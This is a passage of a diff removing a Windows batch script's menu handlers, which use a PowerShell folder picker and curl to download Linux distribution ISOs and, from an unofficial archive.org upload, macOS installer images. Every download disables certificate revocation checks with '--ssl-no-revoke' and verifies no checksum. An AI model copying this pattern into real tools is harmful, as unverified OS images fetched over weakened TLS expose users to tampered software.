-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\Fedora.iso https://mirror.karneval.cz/pub/linux/fedora/linux/releases/41/Workstation/x86_64/iso/Fedora-Workstation-Live-x86_64-41-1.4.iso
-
-move %temp%\MultiTool\Fedora.iso %folder%\Fedora.iso
-
-echo.
-echo Fedora ISO Downloaded to %folder%
-pause
-goto main
-
-
-:189
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\PopOS.iso https://iso.pop-os.org/22.04/amd64/intel/49/pop-os_22.04_amd64_intel_49.iso
-
-move %temp%\MultiTool\PopOS.iso %folder%\PopOS.iso
-
-echo.
-echo PopOS ISO Downloaded to %folder%
-pause
-goto main
-
-
-:1810
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\Debian.iso https://cdimage.debian.org/debian-cd/12.9.0-live/amd64/iso-hybrid/debian-live-12.9.0-amd64-gnome.iso
-
-move %temp%\MultiTool\Debian.iso %folder%\Debian.iso
-
-echo.
-echo Debian ISO Downloaded to %folder%
-pause
-goto main
-
-
-:1811
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\ArchLinux.iso https://geo.mirror.pkgbuild.com/iso/2025.02.01/archlinux-2025.02.01-x86_64.iso
-
-move %temp%\MultiTool\ArchLinux.iso %folder%\ArchLinux.iso
-
-echo.
-echo ArchLinux ISO Downloaded to %folder%
-pause
-goto main
-
-
-:1812
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\LinuxMint.iso https://mirrors.cicku.me/linuxmint/iso/stable/22.1/linuxmint-22.1-cinnamon-64bit.iso
-
-move %temp%\MultiTool\LinuxMint.iso %folder%\LinuxMint.iso
-
-echo.
-echo LinuxMint ISO Downloaded to %folder%
-pause
-goto main
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-REM ================================ MAC OS ====================================
-REM ================================ MAC OS ====================================
-REM ================================ MAC OS ====================================
-
-
-:1813
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\BigSur.iso https://archive.org/download/macos_iso/BigSur_11.7.1.iso
-
-move %temp%\MultiTool\BigSur.iso %folder%\BigSur.iso
-
-echo.
-echo BigSur ISO Downloaded to %folder%
-pause
-goto main
-
-
-:1814
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\Catalina.iso https://archive.org/download/macos_iso/Catalina_10.15.7.iso
-
-move %temp%\MultiTool\Catalina.iso %folder%\Catalina.iso
-
-echo.
-echo Catalina ISO Downloaded to %folder%
-pause
-goto main
-
-
-:1815
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\HighSierra.iso https://archive.org/download/macos_iso/HighSierra_10.13.6.iso
-
-move %temp%\MultiTool\HighSierra.iso %folder%\HighSierra.iso
-
-echo.
-echo HighSierra ISO Downloaded to %folder%
-pause
-goto main
-
-
-:1816
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\Mojave.iso https://archive.org/download/macos_iso/Mojave_10.14.6.iso
-
-move %temp%\MultiTool\Mojave.iso %folder%\Mojave.iso
-
-echo.
-echo Mojave ISO Downloaded to %folder%
-pause
-goto main
-
-
-:1817
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\Monterey.iso https://archive.org/download/macos_iso/Monterey_12.6.1.iso
-
-move %temp%\MultiTool\Monterey.iso %folder%\Monterey.iso
-
-echo.
-echo Monterey ISO Downloaded to %folder%
-pause
-goto main
-
-
-:1818
-setlocal
-
-set "psCommand="(new-object -COM 'Shell.Application')^
-.BrowseForFolder(0,'Please choose a folder.',0,0).self.path""
-
-chcp 437 >NUL
-for /f "usebackq delims=" %%I in (`powershell %psCommand%`) do set "folder=%%I"
-
-setlocal enabledelayedexpansion
-
-endlocal
-
-echo.
-curl --ssl-no-revoke -o %temp%\MultiTool\Ventura.iso https://archive.org/download/macos_iso/Ventura_13.0.1.iso
-
-move %temp%\MultiTool\Ventura.iso %folder%\Ventura.iso
-
-echo.
-echo Ventura ISO Downloaded to %folder%
-pause
-goto main
